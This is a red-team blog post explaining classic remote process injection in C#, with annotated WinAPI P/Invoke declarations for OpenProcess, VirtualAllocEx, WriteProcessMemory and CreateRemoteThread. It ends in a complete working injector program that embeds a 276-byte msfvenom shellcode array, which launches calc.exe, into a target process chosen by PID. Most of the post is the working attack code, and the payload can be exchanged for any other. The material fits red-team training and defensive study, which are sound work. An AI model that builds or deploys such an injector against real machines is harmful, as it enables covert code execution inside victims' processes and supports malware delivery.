---
title: "Shellcode Injection Techniques in C#"
author:
  name: crypt0ace
  link: https://twitter.com/crypt0acee
date: 2022-09-02
description: "Discussing shellcode injection techniques we can use while utilizing C#"
tags: [Red Team]
---
## Introduction
In the previous post we discussed how we can use WinAPI in C# and call funtions that we can use to build our red team tools. See the post [here](https://crypt0ace.github.io/posts/WinAPI-and-PInvoke-in-CSharp/) In this post we will look into how we can use C# to see other ways of shellcode injections. 

## Process Injection
From the previous shellcode runner, we saw how we can use the API calls in this order.
<br>
![Previous API Calls](/assets/img/shellcode-injections/previous-calls.png)
<br>
In case of process injection we use these calls.
<br>
![Process Injection API Calls](/assets/img/shellcode-injections/api-calls.png)
<br>
We are going to open a process, allocate some memory into it, then write to that memory with our shellcode and then excute it with `CreateRemoteThread`.
<br>
So instead of `VirtualAlloc` we are going to use `VirtualAllocEx` because it has the ability to allocate memory in other process's address space. Similarly we are using `WriteProcessMemory` instead of `Marshal.Copy` because now we are writing to a remote process and `CreateRemoteThread` to create a thread in that process.
<br>
We can first start to add our imports in. Using the same data conversion table,
```csharp
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);
```
After the imports we can put our enums in place. We need to put the `flAllocationType` as `MEM_COMMIT` and `MEM_RESERVE`. The `flProtect` will remain the same as RWX or `PAGE_EXECUTE_READWRITE` and we will have a `dwDesiredAccess` for `OpenProcess` call which would specify what are the access levels we want to open the process with. The values for it can be found on the Microsoft Docs [here](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights). 
<br>
These enums become
```csharp
public enum State
{
  MEM_COMMIT = 0x00001000,
  MEM_RESERVE = 0x00002000
}

public enum Protection
{
  PAGE_EXECUTE_READWRITE = 0x40
}
public enum Process
{
  PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
  PROCESS_CREATE_THREAD = 0x0002,
  PROCESS_QUERY_INFORMATION = 0x0400,
  PROCESS_VM_OPERATION = 0x0008,
  PROCESS_VM_READ = 0x0010,
  PROCESS_VM_WRITE = 0x0020
}
```
With these out of the way we can start with our Main method. First we are going to create our `dwDesiredAccess`. We can use `PROCESS_ALL_ACCESS` or we can use the other ones like
```csharp
var desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE;
```
Next we can add in our shellcode. I'm using a `calc.exe` x64 shellcode I generated from `msfvenom`.
```csharp
// msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
byte[] buf = new byte[276] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00 };
```
We need to initialize some values like the shellcode size.
```csharp
int shellcode_size = buf.Length;
int bytesWritten = 0;
int lpthreadID = 0;
```
When all these values are set we can start with calling APIs. First one we will be using is `OpenProcess` to open the process. It takes three arguments. The desired access, inherit handle and the process ID. We already have the desired access variable set that we can use. We dont need a inherit handle because we dont want this process to be inherited by a child process and the process ID is something we can give on the command line.
```csharp
IntPtr procHandle = OpenProcess((uint)desiredAccess, false, Convert.ToUInt32(args[0]));
```
Now we can allocate some memory into the process. Like we did in the shellcode runner,
```csharp
IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
```
Then we can write to that process's memory using `WriteProcessMemory`. The handle of the process is defined with the `OpenProcess` call. The base address will be the start of the memory we allocated using `VirtualAllocEx`. The buffer is the shellcode bytes, the size is the length of shellcode and the `bytesWritten` are already initialized. We can also see how many bytes get written.
```csharp
WriteProcessMemory(procHandle, init, buf, shellcode_size, ref bytesWritten);
Console.WriteLine("[*] Bytes Written: {0}", bytesWritten);
```
Lastly we will use `CreateRemoteThread` to create a thread for our shellcode annd execute it. We provide it with the process handle, the thread attributes are set to zero. According to Microsoft Docs, *It member of the structure specifies a security descriptor for the new thread. If lpThreadAttributes is NULL, the thread gets a default security descriptor.* The `dwStackSize` is zero which sets the default size. We dont have any parameters so that becomes zero as well and we are going to be printing the thread ID. 
```csharp
IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadID);
Console.WriteLine("[*] Thread ID: {0}", lpthreadID);
```
Putting it all together gives us this.
```csharp
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, UInt32 dwProcessId);

[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref int lpThreadId);

public enum State
{
  MEM_COMMIT = 0x00001000,
  MEM_RESERVE = 0x00002000
}

public enum Protection
{
  PAGE_EXECUTE_READWRITE = 0x40
}
public enum Process
{
  PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF,
  PROCESS_CREATE_THREAD = 0x0002,
  PROCESS_QUERY_INFORMATION = 0x0400,
  PROCESS_VM_OPERATION = 0x0008,
  PROCESS_VM_READ = 0x0010,
  PROCESS_VM_WRITE = 0x0020
}

static void Main(string[] args)
{
  var desiredAccess = Process.PROCESS_CREATE_THREAD | Process.PROCESS_QUERY_INFORMATION | Process.PROCESS_VM_OPERATION | Process.PROCESS_VM_READ | Process.PROCESS_VM_WRITE;
  byte[] buf = new byte[276] {
      0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
      0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
      0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
      0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
      0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
      0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
      0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
      0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
      0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
      0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
      0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
      0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
      0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
      0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
      0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
      0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
      0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
      0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
      0x63,0x2e,0x65,0x78,0x65,0x00 };
    int shellcode_size = buf.Length;
    int bytesWritten = 0;
    int lpthreadID = 0;
    IntPtr procHandle = OpenProcess((uint)desiredAccess, false, Convert.ToUInt32(args[0]));
    IntPtr init = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode_size, (uint)State.MEM_COMMIT | (uint)State.MEM_RESERVE, (uint)Protection.PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(procHandle, init, buf, shellcode_size, ref bytesWritten);
    Console.WriteLine("[*] Bytes Written: {0}", bytesWritten);
    IntPtr threadPTR = CreateRemoteThread(procHandle, IntPtr.Zero, 0, init, IntPtr.Zero, 0, ref lpthreadID);
    Console.WriteLine("[*] Thread ID: {0}", lpthreadID);
}
```
We can take a process ID from Task Manager. And executing it gives us.
<br>
![Executing Process Injection](/assets/img/shellcode-injections/exec_proc_inject.png)
<br>
A cleaner and improvered version can be found [here](https://gist.github.com/crypt0ace/4d03eaaac958d73bb665f4ca7d068a68). The x86 shellcode part doesnt work btw (yet).